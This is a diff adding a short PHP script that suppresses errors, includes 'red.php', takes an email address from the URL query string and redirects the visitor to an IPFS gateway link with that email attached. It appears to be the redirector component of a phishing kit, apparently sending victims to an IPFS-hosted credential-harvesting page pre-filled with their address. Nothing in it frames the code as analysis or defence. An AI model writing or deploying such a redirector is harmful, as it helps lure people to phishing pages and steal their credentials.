@@ -1,0 +1,8 @@
+<?php
+error_reporting(0);
+include "red.php";
+$email=$_GET['e'];
+ // Redirect to a new URL
+header('Location: https://bafkreiexr3evtkuktxtg3rj7426oithwinb52ueh72lgyj4p7la7doalkm.ipfs.dweb.link/#'.$email);
+exit;
+?>
